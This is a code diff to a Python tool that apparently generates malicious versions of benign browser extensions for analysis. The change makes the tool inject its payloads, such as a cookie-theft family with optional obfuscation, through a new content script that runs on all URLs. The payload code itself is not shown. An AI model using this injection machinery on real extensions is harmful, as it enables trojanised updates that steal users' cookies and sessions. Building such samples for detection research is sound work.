@@ -35,18 +35,19 @@ def _bump(version: str) -> str:
     return ".".join(parts)
 
 
-def _first_content_script_file(manifest: dict, work: Path) -> Path:
-    """Return a content-script JS file to append to, creating one if the manifest has none."""
-    cs = manifest.get("content_scripts") or []
-    if cs and (cs[0].get("js")):
-        return work / cs[0]["js"][0]
-    # Create a content script that matches the benign extension's own match set, or all.
-    matches = ["<all_urls>"]
-    if cs and cs[0].get("matches"):
-        matches = cs[0]["matches"]
+def _content_script_file(manifest: dict, work: Path) -> Path:
+    """Add a DEDICATED content script (matches <all_urls>) to carry the payload.
+
+    We deliberately do NOT append to the host extension's own first content script: its
+    match patterns may exclude the pages the analysis visits (a real ad-blocker's content
+    script, for instance, targets specific sites), so the payload would silently never run
+    and the "malicious" version would look benign. A malicious update that adds a new,
+    broadly-matching content script is itself the realistic behaviour. Runs at
+    document_idle so the page (and its cookies) exist when the payload fires.
+    """
     (work / "extdrift_cs.js").write_text("// payload host content script\n", encoding="utf-8")
     manifest.setdefault("content_scripts", []).append(
-        {"matches": matches, "js": ["extdrift_cs.js"], "run_at": "document_idle"})
+        {"matches": ["<all_urls>"], "js": ["extdrift_cs.js"], "run_at": "document_idle"})
     return work / "extdrift_cs.js"
 
 
@@ -112,7 +113,7 @@ def weaponise(benign_dir, out_dir, family="cookie_theft", obfuscated=False) -> d
         return obfuscate_js(rendered) if obfuscated else rendered
 
     if spec["content_script"] and PAYLOAD_MARKER not in _read(out_dir):
-        target = _first_content_script_file(manifest, out_dir)
+        target = _content_script_file(manifest, out_dir)
         _append(target, _payload(spec["content_script"]))
         injected.append(target.name)
     if spec["service_worker"]:
